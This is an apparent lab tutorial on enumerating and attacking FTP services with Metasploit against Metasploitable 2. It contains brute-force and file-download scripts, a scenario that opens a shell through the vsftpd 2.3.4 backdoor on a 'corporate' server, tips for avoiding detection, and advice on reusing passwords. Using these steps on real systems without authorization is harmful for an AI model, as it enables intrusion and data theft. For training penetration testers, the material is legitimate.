# FTP Enumeration with Metasploit

## Overview

FTP (File Transfer Protocol) is a standard network protocol used for transferring files between clients and servers on port 21/TCP. This guide covers comprehensive FTP enumeration techniques using Metasploit auxiliary modules to identify service versions, perform brute force attacks, and check for anonymous access.

## FTP Fundamentals

- **Port**: 21/TCP
- **Purpose**: File sharing between client and server
- **Authentication**: Username and password required
- **Common Use**: Web server file management, corporate file sharing

## Lab Environment Setup

For practical exercises, use the **Metasploitable 2** vulnerable machine:

**Lab URL**: [Metasploitable 2 on TryHackMe](https://tryhackme.com/room/metasploitable2)

**Setup Instructions**:

1. Start the Metasploitable 2 machine
2. Note the target IP address
3. Use default credentials if needed for other services

## Initial Service Discovery

### Port Scanning to Identify FTP Service

```bash
# Start Metasploit and create workspace
msf6 > workspace -a ftp_enum
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 192.168.1.100:21 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

### Dynamic Target Scanning Script

```bash
#!/bin/bash

TARGET=$1
WORKSPACE="ftp_scan_$(date +%Y%m%d_%H%M%S)"

echo "[*] Starting FTP service discovery"
echo "[*] Target: $TARGET"
echo "[*] Workspace: $WORKSPACE"

msfconsole -q -x "
workspace -a $WORKSPACE;
use auxiliary/scanner/portscan/tcp;
set RHOSTS $TARGET;
set PORTS 21;
run;
exit"
```

**Usage**:

```bash
chmod +x ftp_discovery.sh
./ftp_discovery.sh 192.168.1.100
```

## FTP Version Detection

### Using FTP Version Scanner

```bash
msf6 > search type:auxiliary name:ftp

# Select FTP version scanner
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > show options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FTPPASS    mozilla@example.com  no        The password for the specified username
   FTPUSER    anonymous         no        The username to authenticate as
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      21               yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads

msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_version) > run

[*] 192.168.1.100:21 - FTP Banner: '220 (vsFTPd 2.3.4)'
[*] Scanned 1 of 1 hosts (100% complete)
```

### Version-Specific Vulnerability Search

```bash
# Search for exploits for detected FTP version
msf6 > search vsftpd

# Example output showing vulnerable versions
# 0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
```

## FTP Brute Force Attacks

### Configuring FTP Login Scanner

```bash
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting                      Required  Description
   ----              ---------------                      --------  -----------
   BLANK_PASSWORDS   false                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                    yes       How fast to bruteforce, from 0 to 5
   PASSWORD                                           no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        File containing passwords, one per line
   RHOSTS                                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             21                                  yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads per host
   USERNAME                                           no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
   VERBOSE           true                                 yes       Whether to print output for all attempts
```

### Performing Brute Force Attack

```bash
# Set target and wordlists
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set THREADS 5
msf6 auxiliary(scanner/ftp/ftp_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ftp/ftp_login) > run

[+] 192.168.1.100:21 - Login Successful: sysadmin:654321
[*] Scanned 1 of 1 hosts (100% complete)
```

### Advanced Brute Force Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=$2
PASS_LIST=$3

echo "[*] Starting FTP brute force attack"
echo "[*] Target: $TARGET"
echo "[*] User list: ${USER_LIST:-default}"
echo "[*] Password list: ${PASS_LIST:-default}"

msfconsole -q -x "
use auxiliary/scanner/ftp/ftp_login;
set RHOSTS $TARGET;
set THREADS 10;
set STOP_ON_SUCCESS true;
$( [ -n "$USER_LIST" ] && echo "set USER_FILE $USER_LIST" );
$( [ -n "$PASS_LIST" ] && echo "set PASS_FILE $PASS_LIST" );
run;
exit"
```

**Usage**:

```bash
# Using default wordlists
./ftp_brute.sh 192.168.1.100

# Using custom wordlists
./ftp_brute.sh 192.168.1.100 custom_users.txt custom_passwords.txt
```

## Anonymous FTP Access Check

### Testing for Anonymous Login

```bash
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FTPPASS     anonymous@example.com  no        The password for the specified username
   FTPUSER     anonymous         no        The username to authenticate as
   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       21               yes       The target port (TCP)
   THREADS     1                yes       The number of concurrent threads

msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/anonymous) > run

[*] 192.168.1.100:21 - Anonymous FTP login allowed (ftp:ftp@192.168.1.100)
[*] Scanned 1 of 1 hosts (100% complete)
```

## Manual FTP Interaction

### Accessing FTP with Discovered Credentials

```bash
# Connect to FTP server manually
ftp 192.168.1.100

# Login with discovered credentials
Name: sysadmin
Password: 654321

# FTP commands after successful login
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r-- 1 0 0 1234 secret.txt
226 Transfer complete

ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening ASCII mode data connection for secret.txt (1234 bytes)
226 Transfer complete
1234 bytes received in 0.00 secs (1.234 MB/s)

ftp> exit
```

### Automated File Download Script

```bash
#!/bin/bash

TARGET=$1
USER=$2
PASS=$3
REMOTE_FILE=$4
LOCAL_FILE=${5:-$REMOTE_FILE}

echo "[*] Downloading $REMOTE_FILE from $TARGET"

ftp -n $TARGET << EOF
user $USER $PASS
binary
get $REMOTE_FILE $LOCAL_FILE
bye
EOF

if [ -f "$LOCAL_FILE" ]; then
    echo "[+] File downloaded successfully: $LOCAL_FILE"
    echo "[*] File contents:"
    cat "$LOCAL_FILE"
else
    echo "[-] Failed to download file"
fi
```

**Usage**:

```bash
chmod +x ftp_download.sh
./ftp_download.sh 192.168.1.100 sysadmin 654321 secret.txt
```

## Comprehensive FTP Enumeration Workflow

### Complete Assessment Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_DIR="ftp_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive FTP enumeration"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# Perform all FTP enumeration steps
msfconsole -q -x "
workspace -a $OUTPUT_DIR;

echo '[+] Checking FTP service status';
use auxiliary/scanner/portscan/tcp;
set RHOSTS $TARGET;
set PORTS 21;
run;

echo '[+] Detecting FTP version';
use auxiliary/scanner/ftp/ftp_version;
set RHOSTS $TARGET;
run;

echo '[+] Checking for anonymous access';
use auxiliary/scanner/ftp/anonymous;
set RHOSTS $TARGET;
run;

echo '[+] Performing brute force attack';
use auxiliary/scanner/ftp/ftp_login;
set RHOSTS $TARGET;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt;
set THREADS 5;
set STOP_ON_SUCCESS true;
run;

echo '[+] Enumeration complete';
services;
exit" > $OUTPUT_DIR/results.txt

echo "[+] Results saved to $OUTPUT_DIR/results.txt"
```

**Usage**:

```bash
chmod +x ftp_complete_enum.sh
./ftp_complete_enum.sh 192.168.1.100
```

## Real-World Attack Scenario

### Scenario: Corporate FTP Server Compromise

```bash
# Step 1: Discover FTP service
./ftp_discovery.sh 10.10.10.50

# Step 2: Version detection reveals vulnerable vsFTPd
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 > set RHOSTS 10.10.10.50
msf6 > run
# Output: 220 (vsFTPd 2.3.4)

# Step 3: Search for exploits
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.50
msf6 > exploit

[*] Command shell session 1 opened

# Alternative: Brute force if no direct exploit
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 > set RHOSTS 10.10.10.50
msf6 > set USER_FILE custom_users.txt
msf6 > set PASS_FILE rockyou.txt
msf6 > run
```

## Best Practices and Considerations

### Security Considerations

1. **Rate Limiting**: Adjust brute force speed to avoid detection
2. **Service Impact**: High-speed brute force may overwhelm the service
3. **Legal Compliance**: Ensure you have permission before testing
4. **Wordlist Selection**: Use appropriate wordlists for the target environment

### Optimization Tips

```bash
# For stealthier operations
msf6 auxiliary(scanner/ftp/ftp_login) > set BRUTEFORCE_SPEED 3
msf6 auxiliary(scanner/ftp/ftp_login) > set THREADS 2

# For comprehensive testing
msf6 auxiliary(scanner/ftp/ftp_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_AS_PASS true
```

### Common FTP Security Issues

1. **Anonymous access enabled**
2. **Weak credentials (admin:admin, ftp:ftp)**
3. **Outdated vulnerable versions**
4. **Directory traversal vulnerabilities**
5. **Unencrypted data transmission**

## Next Steps

After successful FTP enumeration:

1. Download and analyze discovered files
2. Check for sensitive information in transferred files
3. Use credentials for other services (password reuse)
4. Explore directory structure for additional vulnerabilities
5. Move to SMB enumeration for comprehensive network assessment

This comprehensive FTP enumeration approach enables thorough assessment of FTP services, from initial discovery to credential compromise and data exfiltration.
